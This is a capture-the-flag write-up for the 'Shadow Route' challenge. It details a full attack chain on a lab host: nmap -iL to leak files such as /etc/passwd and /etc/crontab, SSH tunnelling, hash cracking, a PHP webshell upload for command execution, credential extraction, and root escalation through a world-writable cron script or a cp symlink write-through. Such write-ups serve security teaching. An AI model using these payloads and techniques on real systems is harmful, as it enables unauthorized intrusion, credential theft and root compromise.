# Shadow Route

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | UniVsThreats 2026 Quals        |
| Category    | misc                           |
| Difficulty  | Hard                           |
| Points      | -                              |

## Description
> Find the unauthorized beacon on the Helios Space Station internal network.
>
> Connection: `ssh pilot@<HOST> -p <PORT>` with password `docking-request`

## TL;DR
SSH tunnel from restricted shell → discover `/stargate` on Apache → upload PHP webshell → RCE as www-data → extract nova password from `db_config.php` → SSH as nova → overwrite cron script (runs as root) → read flag.

## Initial Analysis

### SSH Access and Restricted Shell

Connect as `pilot:docking-request`. The shell is restricted via `ForceCommand /usr/local/bin/pilot-shell.sh` — only allows running `nmap` against the internal subnet.

```
$ sshpass -p 'docking-request' ssh -p 26244 pilot@194.102.62.166

  ★ HELIOS DOCKING PORT - CONNECTED ★
  Welcome, pilot. Restricted terminal active.
  Internal network detected: 127.13.37.0/24
```

### Network Discovery

```
pilot@helios:~$ nmap -sn 127.13.37.0/24
Nmap scan report for 127.13.37.214
Host is up (0.00022s latency).
```

The internal IP changes per instance (random in /24). Full port scan:

```
pilot@helios:~$ nmap -p- 127.13.37.214
PORT     STATE SERVICE
8445/tcp open  copy          # Python SimpleHTTPServer
9043/tcp open  unknown       # Apache 2.4.52
```

Service version detection:

```
pilot@helios:~$ nmap -sV -p 8445,9043 127.13.37.214
PORT     STATE SERVICE VERSION
8445/tcp open  http    Python/3 http.server
9043/tcp open  http    Apache httpd 2.4.52
```

### nmap -iL File Reading Trick

Since the restricted shell only allows nmap, we abused `nmap -iL` (read targets from file) to leak file contents. nmap tries to resolve each line as a hostname, and non-resolvable lines appear as "Failed to resolve" errors — effectively dumping the file:

```
pilot@helios:~$ nmap -iL /etc/crontab
Failed to resolve "# /etc/crontab: system-wide crontab".
Failed to resolve "* * * * * root /bin/bash /home/nova/orbit-sync.sh".
...
```

This revealed the **cron job running orbit-sync.sh as root every minute** — a critical piece of the puzzle.

Other files read via `-iL`:

```bash
# Read /etc/passwd — enumerate users (pilot, nova, astrid)
nmap -iL /etc/passwd

# Read sshd_config — confirmed AllowTcpForwarding yes
nmap -iL /etc/ssh/sshd_config

# Read the flag file hint
nmap -iL /flag.txt
# Failed to resolve "UVT" — confirmed flag format exists at /flag.txt
```

### nmap NSE HTTP Enumeration

From the restricted shell, we used nmap's built-in HTTP scripts to enumerate the web services:

```bash
# HTTP headers
nmap --script http-headers -p 9043 127.13.37.214

# HTTP enumeration (directory/file discovery)
nmap --script http-enum -p 9043,8445 127.13.37.214

# HTTP title
nmap --script http-title -p 9043,8445 127.13.37.214
```

These scripts confirmed the Apache and SimpleHTTPServer services but did not discover `/stargate` (not in nmap's default http-enum database). This required SSH tunneling + proper directory brute-forcing with a larger wordlist.

### SSH Local Port Forwarding

`sshd_config` has `AllowTcpForwarding yes` for pilot. We use SSH -L to reach internal services:

```bash
ssh -L 8080:127.13.37.214:9043 -L 8082:127.13.37.214:8445 \
    -p 26244 pilot@194.102.62.166
```

Or programmatically with paramiko using `transport.open_channel('direct-tcpip', ...)`.

### Web Service Enumeration

**SimpleHTTPServer (8445)** — Serves `/srv/files/`:
- `/pub/transmission.txt` — Base64-encoded credentials
- `/pub/cargo_manifest.txt` — Mentions astrid in the cosmos-data division

**Apache (9043)** — Serves `/var/www/html/`:
- `/` — Helios station public page
- `/cosmos-data/README.txt` — "Ready for data ingestion"
- `/server-status` — Accessible (leaks requests)

### Credential Extraction

Decoding Base64 from `transmission.txt`:

```
Crew Member: astrid
Access Hash: $6$spacesalt$dPI4D181loPF6PWjlb/TEdFS7sdk1d9ouhdGVb4dzqdWVqqG3DiOzFHHfCiTZaHkF7zTQ3QSPxLz.ggGPrd5M0
```

Cracking with john:

```bash
echo '$6$spacesalt$dPI4D181loPF6PWjlb/TEdFS7sdk1d9ouhdGVb4dzqdWVqqG3DiOzFHHfCiTZaHkF7zTQ3QSPxLz.ggGPrd5M0' > hash.txt
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Result: apollo1
```

**Credentials: `astrid:apollo1`**

## Vulnerabilities Identified

Vulnerability chain:

1. **CWE-552**: Credential files accessible via HTTP (transmission.txt)
2. **CWE-434**: Unrestricted File Upload in `/stargate` (allows .php)
3. **CWE-78**: OS Command Injection via webshell
4. **CWE-256**: Plaintext/encoded password in db_config.php
5. **CWE-732**: Incorrect Permission Assignment — orbit-sync.sh is chmod 777 and cron runs it as root
6. **CWE-59**: Improper Link Resolution — `cp -r` follows destination symlinks, allowing write-through to arbitrary files

## Solution — Primary Path: Nova SSH + Cron Privesc

### Discover /stargate (directory brute-forcing)

Using gobuster/ffuf against Apache (port 9043) through the tunnel:

```bash
gobuster dir -u http://127.0.0.1:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# /stargate (Status: 301) → http://localhost:8080/stargate/
```

`/stargate/` is an authentication panel for the crew.

### Login and webshell upload

Login as `astrid:apollo1` in `/stargate/`. The dashboard has a "Telemetry Upload" tab that accepts `.txt, .csv, .dat, .log, .php` files and saves them to `/cosmos-data/`.

Upload a PHP webshell:

```php
<?php system($_GET['cmd']); ?>
```

```python
sess = requests.Session()
sess.post(f"{BASE}/stargate/", data={"username": "astrid", "password": "apollo1"})
files = {'datafile': ('rce.php', b'<?php system($_GET["cmd"]); ?>', 'application/x-php')}
sess.post(f"{BASE}/stargate/dashboard.php", files=files, data={"upload_telemetry": "1"})
```

### RCE as www-data

```
GET /cosmos-data/rce.php?cmd=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Extract nova password

```
GET /cosmos-data/rce.php?cmd=cat+/var/www/html/stargate/db_config.php
```

Reveals `db_config.php` with:

```php
$station_internal = array(
    'sync_user'     => 'nova',
    'sync_pass'     => '4RnWMuOsAR5T3KClI6VQlH1ATq7P0qpN...X8X0',
    'sync_protocol' => 'ssh',
    'sync_port'     => 22,
    'sync_script'   => '/home/nova/orbit-sync.sh'
);
```

The `sync_pass` is a multi-layer encoded string (Base64 → Base32 → Hex → etc.) that decodes to:

```
N3bul@C0re!9987648723486326483246876vhgzxbcvhjdsa
```

### SSH as nova

```bash
ssh nova@<HOST> -p <PORT>
# Password: N3bul@C0re!9987648723486326483246876vhgzxbcvhjdsa
```

Nova has a full shell (no ForceCommand).

### Privilege escalation via cron

```bash
nova@helios:~$ ls -la orbit-sync.sh
-rwxrwxrwx 1 nova nova 697 Feb 25 10:49 orbit-sync.sh

nova@helios:~$ cat /etc/crontab | grep orbit
* * * * * root /bin/bash /home/nova/orbit-sync.sh
```

**orbit-sync.sh is chmod 777 (world-writable) and cron runs it as root every minute.** Overwrite the script:

```bash
echo 'cp /root/root.txt /tmp/flag.txt && chmod 444 /tmp/flag.txt' > /home/nova/orbit-sync.sh
sleep 65
cat /tmp/flag.txt
```

## Solution — Second Path: Symlink Attack (www-data only, no nova SSH required)

> **Note**: This alternative path was discovered and verified post-CTF. It was not used during the competition.

This path skips steps 4-5 entirely (no need to extract nova credentials or SSH as nova). It exploits a subtle behavior of GNU `cp -r` when the **destination** is a symlink.

### Background: orbit-sync.sh cron behavior

The cron job runs this script as root every minute:

```bash
#!/bin/bash
DATA_DIR="/var/www/html/cosmos-data"
BACKUP_DIR="/var/backups/telemetry"
mkdir -p "$BACKUP_DIR"
cp -r "$DATA_DIR"/* "$BACKUP_DIR/" 2>/dev/null
```

Key insight: `cp -r` copies **source** symlinks as symlinks (preserves them). But when the **destination** already contains a symlink, `cp` **follows it** and writes through to the target file. This is standard POSIX behavior — GNU coreutils 8.32 confirmed.

### Attack chain (3 cron cycles)

**Cycle 1 — Plant the symlink:**

As www-data via webshell, create a symlink in cosmos-data pointing to orbit-sync.sh:

```php
<?php symlink('/home/nova/orbit-sync.sh', '/var/www/html/cosmos-data/orbitsync'); ?>
```

When cron runs, root executes `cp -r cosmos-data/orbitsync backup/`. Since the source is a symlink, `cp -r` preserves it:

```
backup/orbitsync → /home/nova/orbit-sync.sh   (symlink, owned by root)
```

**Cycle 2 — Replace symlink with payload file:**

Now delete the symlink in cosmos-data and replace it with a **regular file** containing the payload:

```bash
rm -f /var/www/html/cosmos-data/orbitsync
echo '#!/bin/bash
cp /root/root.txt /tmp/flag.txt
chmod 444 /tmp/flag.txt' > /var/www/html/cosmos-data/orbitsync
```

When cron runs again, root executes `cp -r cosmos-data/orbitsync backup/orbitsync`. Now:
- **Source**: regular file (our payload)
- **Destination**: symlink → `/home/nova/orbit-sync.sh`

`cp` follows the destination symlink and writes our payload content **directly into `/home/nova/orbit-sync.sh`**. Root can traverse `/home/nova/` (even though it's 750/nova:nova) because root bypasses permission checks.

**Cycle 3 — Payload executes:**

The next cron execution runs `/bin/bash /home/nova/orbit-sync.sh`, which now contains our payload. Root copies `/root/root.txt` to `/tmp/flag.txt`.

```
GET /cosmos-data/rce.php?cmd=cat+/tmp/flag.txt
→ UVT{y0u_f0und_m3_1n_4_d4rk_c0rn3r_fr0m_4_sh4d0w_...}
```

### Verified behavior

```bash
# Test: cp -r writes through destination symlinks
$ echo 'original' > /tmp/target.txt
$ ln -s /tmp/target.txt /tmp/link
$ echo 'PAYLOAD' > /tmp/source.txt
$ cp -r /tmp/source.txt /tmp/link
$ cat /tmp/target.txt
PAYLOAD                          # ← wrote through the symlink
$ ls -la /tmp/link
lrwxrwxrwx ... /tmp/link -> /tmp/target.txt   # ← symlink still intact
```

### Why this works

| Condition | Status |
|-----------|--------|
| www-data owns cosmos-data (can create/delete files) | Yes |
| www-data can create symlinks to /home/nova/orbit-sync.sh | Yes (broken symlink — can't read, but can create) |
| `cp -r` preserves source symlinks | Yes (GNU coreutils 8.32) |
| `cp` follows destination symlinks | Yes (default POSIX behavior) |
| Root can traverse /home/nova/ (750, nova:nova) | Yes (root bypasses permissions) |
| orbit-sync.sh is writable | Yes (chmod 777) |

### Advantages over primary path
- No need to decode the multi-layer encoded nova password
- No need for a second SSH connection
- Entire exploit runs through the webshell as www-data
- Requires 3 cron cycles (~3 minutes) instead of directly overwriting

## Discarded Approaches

1. **SSH -R (Remote Port Forwarding)**: `GatewayPorts` defaults to `no`, bind always goes to 127.0.0.1 instead of 127.13.37.X. Not useful for making nmap reach our server.
2. **NSE script upload via http-fetch**: Could not download our NSE because SSH -R doesn't bind on the target IP.
3. **nmap -oN to write Lua**: nmap output is not valid Lua.
4. **Path traversal on SimpleHTTPServer**: Blocked.
5. **HTTP PUT/WebDAV on Apache**: Not enabled (405 Method Not Allowed).
6. **SSH as nova with apollo1**: Auth failed — different password.
7. **broadcast-listener nmap**: Requires root privileges.
8. **Reading orbit-sync.sh as pilot**: chmod 700, owned by nova — Permission denied.
9. **Fuzzing without medium wordlist**: We didn't find `/stargate` because it wasn't in our initial wordlist.
10. **Direct symlink read via backup**: `cp -r` preserves symlinks, and www-data cannot read through symlinks to /root/ or traverse /home/nova/. Only useful as a write primitive, not read.

## Final Exploit

See `solve_final.py` for the primary path (automated, paramiko + requests).

### Usage

```bash
python3 solve_final.py <HOST> <PORT>
# Default: python3 solve_final.py 194.102.62.166 26244
```

## Flag
```
UVT{y0u_f0und_m3_1n_4_d4rk_c0rn3r_fr0m_4_sh4d0w_t3rm1n4l_h0peFully_y0U_WoUlD_r3MemBer_M3!!!_1_will_watch_yOur_m0v3s_frOm_h3r3}
```

## Key Lessons

- **Always use comprehensive wordlists for directory brute-forcing**: Our manual fuzzing didn't include "stargate". Using `directory-list-2.3-medium.txt` or larger would have found it immediately.
- **File upload + allowed extensions = game over**: The app allows `.php` uploads to an Apache-served directory → instant RCE.
- **Cron jobs as root + world-writable scripts = trivial privesc**: Always check permissions on scripts referenced in crontab.
- **SSH tunneling is essential**: Without `-L` we couldn't have interacted with internal services. `AllowTcpForwarding yes` was the key hint.
- **`cp -r` destination symlink behavior is exploitable**: While `cp -r` preserves source symlinks, it follows destination symlinks by default. This creates a write primitive when a cron job runs `cp -r` as root into a directory containing attacker-planted symlinks.
- **Don't waste time on rabbit holes**: We tried SSH -R, NSE injection, and broadcast scanning when the solution was much more direct (directory busting → upload → privesc).

## References

- [SSH Local Port Forwarding](https://www.ssh.com/academy/ssh/tunneling/example)
- [Paramiko Port Forwarding](https://docs.paramiko.org/en/stable/)
- [PHP Webshell via File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Cron Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-path)
- [Symlink Attacks via cp](https://cwe.mitre.org/data/definitions/59.html)
